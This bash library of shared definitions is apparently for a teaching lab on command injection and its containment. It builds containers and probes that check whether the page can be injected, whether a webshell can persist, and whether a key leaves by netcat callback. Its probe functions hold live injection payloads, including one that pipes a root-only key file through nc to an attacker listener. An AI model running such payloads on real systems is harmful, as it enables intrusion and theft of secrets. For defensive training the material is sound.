#!/usr/bin/env bash
# Shared definitions for the command injection and containment lab.
# Sourced by spawn/status/shell/reset/teardown/selftest. No side effects.
#
# This is the single source of truth for the lab's AS number, subnets, container
# names, IPs, interface names, account names and file paths. Every other script
# sources it; never hardcode any of these in a second place.
#
# The lab is played attacker then defender. An appliance serves a public
# network-tools page that shells out to ping with the hostname the caller
# supplied, unquoted. Part 1 has the learner append a second command to that
# hostname and open a shell that dials back out to a listener they control.
#
# Part 2 is three pieces of configuration and no change to the program. Each one
# closes something different, and the order they are applied in is the lesson:
#
#   2A  the web server drops to a service account, so the injected command runs
#       as svc rather than root and can no longer read the appliance's key
#   2B  the webroot goes back to root ownership, so the injected command can no
#       longer leave a second CGI behind
#   2C  the gateway permits only the traffic the appliance legitimately
#       originates, which is what finally kills the callback
#
# 2A and 2B visibly do NOT stop the reverse shell. That is the point: least
# privilege caps what the injection is worth, and egress control is what stops
# it. selftest.sh asserts both halves, so a lab where 2A secretly killed the
# callback would fail there rather than making 2C pointless.

AS=120
DC=LAB

# ---------------------------------------------------------------------------
# Two segments meeting at the gateway.
#
#   inside   : the appliance and the operator's workstation, over a switch
#   outside  : the upstream monitor and the attacker's machine, over a switch
#              of their own
#
# The gateway FORWARDS (net.ipv4.ip_forward is 1) and does not translate
# addresses. Without NAT every packet the appliance originates still carries the
# appliance's own address when it reaches the gateway, which is what lets Part
# 2C's allowlist be written against that one source. Behind a NAT every inside
# host would look like the gateway and the rule could not name the appliance.
INSIDE_SUBNET="120.0.0.0/24"
OUTSIDE_SUBNET="120.1.0.0/24"
PREFIXLEN=24

GW_INSIDE_IP="120.0.0.1"
GW_OUTSIDE_IP="120.1.0.1"

WEB_IP="120.0.0.10"           # the appliance; the vulnerable page runs here
OPS_IP="120.0.0.20"           # the operator's workstation; the legitimate caller

MON_IP="120.1.0.20"           # the upstream monitor the appliance probes
ATTACKER_IP="120.1.0.66"      # the outside machine; the listener runs here

# ---------------------------------------------------------------------------
# The service.
#
# lighttpd serves a static page on HTTP_PORT and runs one CGI, at CGI_PATH. The
# page is public on purpose: it is a hosting appliance's network-tools widget,
# the kind a customer is meant to be able to reach, so nothing in this lab turns
# on the endpoint having been exposed by mistake. The injection is the entry and
# the lab is about what the injection is worth.
HTTP_PORT=80
CGI_PATH="/cgi-bin/diag.cgi"
CGI_URL="http://${WEB_IP}:${HTTP_PORT}${CGI_PATH}"

# Where the web server's files live, and the pristine copies the starter config
# installs from. WEBROOT is what Part 2B re-owns.
WEBROOT="/var/www"
CGI_DIR="${WEBROOT}/cgi-bin"
CGI_FILE="${CGI_DIR}/diag.cgi"
CGI_PRISTINE="/usr/local/lib/minilabs/diag.cgi"
CGI_SOURCE="/usr/local/share/minilabs/diag.c"
LIGHTTPD_CONF="/etc/lighttpd/appliance.conf"
LIGHTTPD_PID="/run/lighttpd.pid"

# The account Part 2A hands the web server. Pinned in the image, so the uid the
# handout and the answer key quote is the uid the learner reads back.
SVC_USER="svc"
SVC_UID=1001

# ---------------------------------------------------------------------------
# The two things the attacker is after, and the file they try to leave behind.
#
# MARKER_FILE is mode 0600 root:root. Reading it is the marker command the plan's
# oracle names: the listener receiving MARKER_STRING means the callback both
# completed a connection AND carried data out. After Part 2A the connection
# still completes and carries nothing, which is a different failure from Part
# 2C's, and status.sh reports the two separately.
MARKER_FILE="/etc/appliance/backup.key"
MARKER_STRING="APPLIANCE-BACKUP-KEY-9F2C41D7B0A38E56"

# The second CGI the attacker drops into the webroot for persistence. It is not
# shipped anywhere: the attacker writes it from the shell, and Part 2B is what
# stops the write.
PERSIST_FILE="${CGI_DIR}/persist.cgi"
PERSIST_PATH="/cgi-bin/persist.cgi"
PERSIST_STRING="PERSISTENT-WEBSHELL"

# The attacker's listener, and where what it receives is written.
LISTEN_PORT=4444
LOOT_FILE="/root/loot.txt"

# ---------------------------------------------------------------------------
# Interface names. Host-side NICs follow the platform's <AS>-<segment>
# convention; the gateway names each of its two NICs after the segment it faces.
LAN_IF="${AS}-lan"
EXT_IF="${AS}-ext"
GW_INSIDE_IF="lan"
GW_OUTSIDE_IF="ext"

# One switch per segment, so no port of one is a port of the other and the only
# path from the appliance to the attacker is through the gateway. That is what
# makes the gateway the one place an egress rule can be enforced.
SW_IN="S1"
SW_OUT="S2"
SW_IN_CTN="${AS}_L7_${DC}_${SW_IN}"
SW_OUT_CTN="${AS}_L7_${DC}_${SW_OUT}"
SWITCHES=(S1 S2)
BR="br0"
sw_port_of() { echo "${AS}-$1"; }        # 120-web, 120-ops, 120-attacker, ...

# ---------------------------------------------------------------------------
# Container names: <AS>_L7_<DC>_<name>.
GW_CTN="${AS}_L7_${DC}_gw"
WEB_CTN="${AS}_L7_${DC}_web"
OPS_CTN="${AS}_L7_${DC}_ops"
MON_CTN="${AS}_L7_${DC}_mon"
ATTACKER_CTN="${AS}_L7_${DC}_attacker"

INSIDE_HOSTS=(web ops)
OUTSIDE_HOSTS=(mon attacker)

# Every device that gets a starter config, in apply order: the gateway first so
# the two segments can reach each other, then the monitor the appliance probes,
# then the appliance itself, then the two client machines.
DEVICES=(gw mon web ops attacker)

ctn_of() { echo "${AS}_L7_${DC}_$1"; }

ip_of() {   # <role> -> its address
    case "$1" in
        gw)       echo "$GW_INSIDE_IP" ;;
        web)      echo "$WEB_IP" ;;
        ops)      echo "$OPS_IP" ;;
        mon)      echo "$MON_IP" ;;
        attacker) echo "$ATTACKER_IP" ;;
        *)        echo "" ;;
    esac
}

# Lab root (parent of scripts/), resolved regardless of the caller's CWD.
LAB_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )/.." >/dev/null 2>&1 && pwd )"

HOST_IMAGE="d_host_cmdinj"
SWITCH_IMAGE="miniinterneteth/d_switch"

# Open vSwitch is started by hand rather than by the image's supervisord
# entrypoint, which runs ovs-ctl with its default --mlockall. In a user
# namespace CAP_IPC_LOCK cannot exceed RLIMIT_MEMLOCK, so thread stacks fail to
# lock and ovs-vswitchd dies with "pthread_create failed". --no-mlockall is what
# makes this lab boot on a rootless daemon.
SWITCH_CMD='/usr/share/openvswitch/scripts/ovs-ctl start --no-mlockall --system-id=random && exec sleep infinity'

# net.ipv4.ping_group_range is pinned to "0 0" on every container. A rootless
# daemon rejects "0 2147483647" because the gid is outside the user namespace's
# map, and the two daemons ship different defaults, so pinning it is what makes
# ping print the same thing on both. The appliance's own page keeps working
# after Part 2A drops it to svc because the base image's /bin/ping is setuid
# root, not because svc is inside this range.
PING_SYSCTL=(--sysctl "net.ipv4.ping_group_range=0 0")

# ---------------------------------------------------------------------------
# The learner's egress allowlist, on the gateway (Part 2C).
#
# The table is named `egress` and the chain `forward` -- not `fwd`, which is an
# nft keyword. reset.sh removes whatever the learner wrote by re-running the
# gateway's starter config, which deletes the table.
NFT_TABLE="egress"
NFT_CHAIN="forward"

# ---------------------------------------------------------------------------
# True when anything in <dir> is newer than the image built from it. An image is
# otherwise only rebuilt when it is missing, which means an edit to
# image/Dockerfile or image/diag.c never reaches a machine that built the image
# once -- and in this lab an unrebuilt image means the learner attacks a
# different program from the one the handout quotes.
image_older_than_source() {   # <image> <dir>
    local img="$1" dir="$2" built newest
    built="$( docker image inspect -f '{{.Created}}' "$img" 2>/dev/null )" || return 1
    built="$( date -d "$built" +%s 2>/dev/null )" || return 1   # non-GNU date: skip the check
    newest="$( find "$dir" -type f -printf '%T@\n' 2>/dev/null | sort -n | tail -1 )"
    [ -n "$newest" ] || return 1
    [ "${newest%.*}" -gt "$built" ]
}

ensure_images() {
    if ! docker image inspect "$HOST_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] building $HOST_IMAGE from $LAB_DIR/image (first run only)"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to build $HOST_IMAGE" >&2; return 1; }
    elif image_older_than_source "$HOST_IMAGE" "$LAB_DIR/image"; then
        echo "[spawn] rebuilding $HOST_IMAGE: $LAB_DIR/image changed since it was built"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to rebuild $HOST_IMAGE" >&2; return 1; }
    fi
    if ! docker image inspect "$SWITCH_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] pulling $SWITCH_IMAGE (first run only)"
        docker pull "$SWITCH_IMAGE" >/dev/null \
            || { echo "failed to pull $SWITCH_IMAGE" >&2; return 1; }
    fi
}

# ---------------------------------------------------------------------------
# Privileged host networking, performed from a helper container, so the learner
# needs docker access and nothing else. Both ends of every veth pair are moved
# into lab containers, so the namespace the pair is created in never matters,
# which is why the helper runs --network=none rather than --network=host.
HELPER_CTN="$( ctn_of netadmin_helper )"

helper_start() {
    docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true
    docker run -d --rm --name "$HELPER_CTN" \
        --privileged --network=none --pid=host \
        "$HOST_IMAGE" sleep 600 >/dev/null
    for _ in $(seq 1 40); do
        if docker exec "$HELPER_CTN" true >/dev/null 2>&1; then
            return 0
        fi
        sleep 0.25
    done
    echo "helper container $HELPER_CTN did not become ready" >&2
    return 1
}

helper() { docker exec "$HELPER_CTN" "$@"; }
helper_stop() { docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true; }

# ---------------------------------------------------------------------------
# Shared read-only probes. status.sh and selftest.sh both use these, so the two
# cannot disagree about the lab's success condition.

running() { docker ps --format '{{.Names}}' | grep -qx "$1"; }

# --- calling the page ------------------------------------------------------

# Request the diagnostics page from <role> with <host> as the parameter, and
# print what it returned. --data-urlencode -G is what puts a semicolon and a
# space into the query string without the caller writing percent escapes; -m
# bounds the wait so a request whose injected command is blocked by the gateway
# returns rather than hanging until curl's default timeout.
CURL_TIMEOUT=10
diag_request() {   # <from-role> <host-parameter>
    docker exec "$( ctn_of "$1" )" \
        curl -s -m "$CURL_TIMEOUT" -G --data-urlencode "host=$2" "$CGI_URL" 2>/dev/null
}

# The page answering a legitimate request: an echo reply from the upstream
# monitor, which is an OUTSIDE address, so the probe really does cross the
# gateway and Part 2C's allowlist really is exercised by this check. Every
# defence stage is paired with it, so a "defence" that worked by stopping the
# service fails here instead of passing.
endpoint_serves() {   # -> ok | broken
    if diag_request ops "$MON_IP" | grep -q 'bytes from'; then echo ok; else echo broken; fi
}

# The uid the injected command runs as, read out of `id` through the injection
# itself rather than out of the container's process table: the question Part 2A
# answers is who the CALLER's command runs as.
injected_uid() {   # -> e.g. 0 or 1001, or empty when the injection produced nothing
    diag_request attacker "${MON_IP}; id" \
        | sed -n 's/^uid=\([0-9]*\).*/\1/p' | head -1
}

# Whether the injected command can read the appliance's key. This is what Part 2A
# takes away.
marker_readable() {   # -> yes | no
    if diag_request attacker "${MON_IP}; cat ${MARKER_FILE}" | grep -qF "$MARKER_STRING"
    then echo yes; else echo no; fi
}

# Whether the injected command can leave a second CGI in the webroot AND have the
# web server run it. Both halves matter: Part 2B stops the write, and the fetch
# is what proves the write would otherwise have been worth something. The file is
# removed again either way, so running Status never leaves a webshell behind.
persistence_possible() {   # -> yes | no
    local verdict=no
    diag_request attacker \
        "${MON_IP}; { echo '#!/bin/sh'; echo 'echo Content-Type: text/plain'; echo 'echo'; echo 'echo ${PERSIST_STRING}'; } > ${PERSIST_FILE}; chmod 755 ${PERSIST_FILE}" \
        >/dev/null 2>&1
    if docker exec "$OPS_CTN" curl -s -m 5 "http://${WEB_IP}:${HTTP_PORT}${PERSIST_PATH}" 2>/dev/null \
            | grep -qF "$PERSIST_STRING"; then
        verdict=yes
    fi
    docker exec "$WEB_CTN" rm -f "$PERSIST_FILE" >/dev/null 2>&1 || true
    echo "$verdict"
}

# --- the callback ----------------------------------------------------------

# Arm a one-shot listener on the attacker for LISTEN_PORT, discarding whatever a
# previous run left. `nc -l -p` in BusyBox serves one connection and exits, so no
# loop is needed; -v puts its "connect to ... from ..." line on stderr, which is
# how a connection that completed and carried nothing is told apart from one that
# never completed at all.
LOOT_ERR="/root/loot.err"
listener_arm() {
    docker exec "$ATTACKER_CTN" sh -c \
        "pkill -x nc >/dev/null 2>&1; pkill -x tail >/dev/null 2>&1; \
         rm -f '$LOOT_FILE' '$LOOT_ERR'; \
         setsid sh -c \"tail -f /dev/null | nc -v -l -p $LISTEN_PORT > '$LOOT_FILE' 2> '$LOOT_ERR'\" &" \
        >/dev/null 2>&1
    sleep 1
}

# Stop the listener and the process that was holding its standard input open.
# `pkill -x` matches the process NAME exactly rather than the whole argv, which
# is what keeps it from matching the `sh -c` that is running the pkill itself.
# The container's PID 1 is `sleep infinity`, so nothing here may match `sleep`.
listener_stop() {
    docker exec "$ATTACKER_CTN" sh -c \
        'pkill -x nc >/dev/null 2>&1; pkill -x tail >/dev/null 2>&1; true' >/dev/null 2>&1 || true
}

# Did anything connect to the listener? Read from nc's own verbose line rather
# than from the size of what arrived, so a connection that completed and sent
# nothing still counts as a connection.
listener_connected() {   # -> yes | no
    if docker exec "$ATTACKER_CTN" grep -qi 'connect' "$LOOT_ERR" 2>/dev/null
    then echo yes; else echo no; fi
}

# Did the listener receive the output of the marker command?
listener_got_marker() {   # -> yes | no
    if docker exec "$ATTACKER_CTN" grep -qF "$MARKER_STRING" "$LOOT_FILE" 2>/dev/null
    then echo yes; else echo no; fi
}

# The headline oracle, in one call: arm the listener, inject a command that reads
# the marker file and pipes it out to the listener, and report both facts. It
# prints "<connected> <marker>", each yes or no:
#
#   yes yes   the callback works and carries the key out       (starter state)
#   yes no    the callback still works, and carries nothing    (after Part 2A)
#   no  no    the callback never completes                     (after Part 2C)
#
# `nc -w 3` bounds the connect, so when the gateway drops the SYN the injected
# command gives up rather than holding the request open until curl's timeout.
callback_probe() {
    listener_arm
    diag_request attacker \
        "${MON_IP}; cat ${MARKER_FILE} | nc -w 3 ${ATTACKER_IP} ${LISTEN_PORT}" \
        >/dev/null 2>&1
    sleep 2
    local c m
    c="$( listener_connected )"
    m="$( listener_got_marker )"
    listener_stop
    echo "$c $m"
}

# --- the appliance's own configuration -------------------------------------

# The account lighttpd runs its CGI as, read from its configuration rather than
# from the process table, because the configuration is what the learner writes.
# Prints the account name, or "root" when no server.username is set: lighttpd
# started as root and given no account to change to stays root.
lighttpd_account() {
    local u
    u="$( docker exec "$WEB_CTN" sh -c \
        "sed -n 's/^[[:space:]]*server.username[[:space:]]*=[[:space:]]*\"\\([^\"]*\\)\".*/\\1/p' '$LIGHTTPD_CONF' 2>/dev/null | tail -1" \
        2>/dev/null | tr -d '\r' )"
    if [ -n "$u" ]; then echo "$u"; else echo root; fi
}

lighttpd_running() {
    docker exec "$WEB_CTN" sh -c 'pgrep -x lighttpd >/dev/null 2>&1'
}

# Who owns the webroot, and whether anyone outside that owner may write into it.
# Part 2B is exactly these two facts changing.
webroot_owner() {
    docker exec "$WEB_CTN" stat -c '%U:%G' "$CGI_DIR" 2>/dev/null | tr -d '\r'
}

# Whether anyone outside the owner may write into the CGI directory. Read from
# the symbolic mode rather than the octal one, so the group bit and the other bit
# are each checked in their own position instead of by arithmetic on a digit.
webroot_group_other_writable() {   # -> yes | no
    local m
    m="$( docker exec "$WEB_CTN" stat -c '%A' "$CGI_DIR" 2>/dev/null | tr -d '\r' )"
    if [ "${m:5:1}" = w ] || [ "${m:8:1}" = w ]; then echo yes; else echo no; fi
}

# --- the gateway -----------------------------------------------------------

nft_ruleset() {
    docker exec "$GW_CTN" nft list ruleset 2>/dev/null | grep -v '^[[:space:]]*$' || true
}
